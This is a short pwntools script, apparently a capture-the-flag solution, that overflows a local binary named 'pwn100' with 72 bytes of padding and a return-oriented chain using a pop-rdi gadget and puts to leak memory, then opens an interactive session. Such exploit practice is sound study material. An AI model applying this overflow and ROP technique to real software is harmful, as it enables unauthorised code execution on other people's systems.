#!/usr/bin/python
#coding:utf-8
from pwn import *

pwn_file='./pwn100'
binary=ELF(pwn_file)
p=process(pwn_file)
context(arch='amd64',os='linux',log_level='debug')

putsPLT=ELF(pwn_file).symbols['puts']
poprdi=0x400763         #ROPgadget --binary pwn100 --only "pop|ret"|grep rdi        0x0000000000400763 : pop rdi ; ret
mainAddress=0x4006B8
startAddress=0x400500


def debug(addr1='0x40068C'):
    raw_input('debug')
    gdb.attach(p,"b * "+addr1)
debug()

payload=flat(['A'*72,poprdi,mainAddress,putsPLT,startAddress])
p.send(payload)
p.interactive()